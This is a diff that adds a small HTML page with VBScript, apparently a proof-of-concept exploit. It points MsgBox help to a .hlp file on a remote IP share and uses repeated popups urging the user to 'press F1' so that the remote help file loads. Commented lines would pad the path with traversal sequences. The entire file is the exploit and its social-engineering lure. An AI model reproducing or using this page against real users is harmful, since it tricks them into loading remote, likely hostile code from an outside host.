@@ -1,0 +1,15 @@
+&lt;html&gt;
+&lt;script type=&quot;text/vbscript&quot;&gt;
+big = &quot;\\184.73.14.110\PUBLIC\test.hlp&quot;
+ 
+//For i=1 to 2500
+//  big = big &amp; &quot;\..\&quot;
+//Next
+ 
+ 
+MsgBox &quot;please press F1 to save the world&quot;, ,&quot;please save the world&quot;,
+big, 1
+MsgBox &quot;press F1 to close this annoying popup&quot;, ,&quot;&quot;, big, 1
+MsgBox &quot;press F1 to close this annoying popup&quot;, ,&quot;&quot;, big, 1
+&lt;/script&gt;
+&lt;/html&gt;
